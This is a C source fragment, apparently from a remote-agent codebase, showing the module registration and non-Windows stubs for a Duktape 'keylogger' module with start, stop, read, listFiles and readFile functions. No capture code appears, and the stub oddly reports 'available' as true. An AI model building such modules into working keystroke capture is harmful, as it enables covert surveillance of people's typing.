    duk_push_c_function(ctx, Keylog_ReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
}

void ILibDuktape_Keylogger_Init(duk_context *ctx)
{
    ILibDuktape_ModSearch_AddHandler(ctx, "keylogger", Keylog_Push);
}

#else

/* Non-Windows stub so the module always exists in the agent. */

static duk_ret_t Keylog_StubUnsupported(duk_context *ctx)
{
    return ILibDuktape_Error(ctx, "keylogger is only available on Windows");
}

static duk_ret_t Keylog_StubGetState(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "available");
    duk_push_boolean(ctx, 0);
    duk_put_prop_string(ctx, -2, "running");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "totalKeys");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bufferLines");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bufferSize");
    duk_push_string(ctx, ".");
    duk_put_prop_string(ctx, -2, "dir");
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "currentFile");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "maxFileSize");
    duk_push_string(ctx, "keylogger is only available on Windows agents");
    duk_put_prop_string(ctx, -2, "lastError");
    return 1;
}

static duk_ret_t Keylog_StubEmptyArray(duk_context *ctx)
{
    duk_push_array(ctx);
    return 1;
}

static duk_ret_t Keylog_StubReadFile(duk_context *ctx)
{
    duk_push_object(ctx);
    duk_push_string(ctx, "");
    duk_put_prop_string(ctx, -2, "data");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "size");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "bytes");
    duk_push_number(ctx, 0.0);
    duk_put_prop_string(ctx, -2, "offset");
    duk_push_boolean(ctx, 1);
    duk_put_prop_string(ctx, -2, "done");
    return 1;
}

static void Keylog_Push(duk_context *ctx, void *chain)
{
    (void)chain;
    duk_push_object(ctx);
    duk_push_c_function(ctx, Keylog_StubUnsupported, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "start");
    duk_push_c_function(ctx, Keylog_StubUnsupported, DUK_VARARGS);
    duk_put_prop_string(ctx, -2, "stop");
    duk_push_c_function(ctx, Keylog_StubGetState, 0);
    duk_put_prop_string(ctx, -2, "getState");
    duk_push_c_function(ctx, Keylog_StubEmptyArray, 1);
    duk_put_prop_string(ctx, -2, "read");
    duk_push_c_function(ctx, Keylog_StubEmptyArray, 0);
    duk_put_prop_string(ctx, -2, "listFiles");
    duk_push_c_function(ctx, Keylog_StubReadFile, 3);
    duk_put_prop_string(ctx, -2, "readFile");
}

void ILibDuktape_Keylogger_Init(duk_context *ctx)
{
    ILibDuktape_ModSearch_AddHandler(ctx, "keylogger", Keylog_Push);
}

#endif
